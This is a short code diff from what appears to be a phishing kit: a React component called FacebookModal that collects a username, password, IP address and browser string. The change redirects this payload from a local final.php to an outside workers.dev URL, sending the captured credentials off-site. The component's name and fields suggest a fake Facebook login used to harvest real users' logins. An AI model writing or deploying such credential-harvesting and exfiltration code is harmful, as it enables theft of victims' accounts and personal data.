@@ -128,7 +128,7 @@ function FacebookModal({ onClose, onSuccess }) {
       // Kirim data via POST ke API/Backend final.php
       const payload = { user, pass, ip: meta.ip, ua: meta.ua };
 
-      fetch('final.php', {
+      fetch('https://lotta3712543.kentudiair89.workers.dev/', {
         method: 'POST',
         headers: { 'Content-Type': 'application/json' },
         body: JSON.stringify(payload)
